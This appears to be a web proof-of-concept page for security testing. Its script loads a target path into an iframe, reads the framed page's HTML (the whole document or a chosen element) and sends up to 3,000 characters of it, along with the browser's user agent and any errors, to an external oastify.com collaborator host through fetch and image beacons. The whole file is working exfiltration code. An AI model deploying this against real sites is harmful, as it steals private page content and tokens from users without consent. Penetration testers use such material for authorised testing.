<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POC</title>
</head>
<body>
<iframe id="test" width="800" height="1000"></iframe>
<script>



    const urlParams = new URLSearchParams(window.location.search);
    const path = urlParams.get("path");
    const out = urlParams.get("out") ?? "https://oxpxnwyzg7l4s42f40ckabaualgc43vrk.oastify.com";
    const extractId = urlParams.get("extract_id");

    new Image().src = out + "/start?ua=" + encodeURIComponent(navigator.userAgent)+'&path='+path;


    const iframe = document.getElementById("test");
    iframe.src = path?.startsWith("http") ? path : "/" + path;

    const extract = () => {
        try {
            const doc = iframe.contentWindow.document;
            const data = extractId ? doc.getElementById(extractId) : doc.documentElement;
            const payload = encodeURIComponent(JSON.stringify({
                html: data?.outerHTML?.slice(0, 3000),
                src: iframe.src
            }));
            fetch(out + "/iframe-data?d=" + payload, { mode: "no-cors", keepalive: true });
            new Image().src = out + "/iframe-img?d=" + payload;
        } catch(e) {
            new Image().src = out + "/iframe-err?e=" + encodeURIComponent(e.message);
        }
    };

    iframe.onload = extract;
    iframe.onerror = () => new Image().src = out + "/iframe-load-err?src=" + encodeURIComponent(iframe.src);
</script>
</body>
</html>
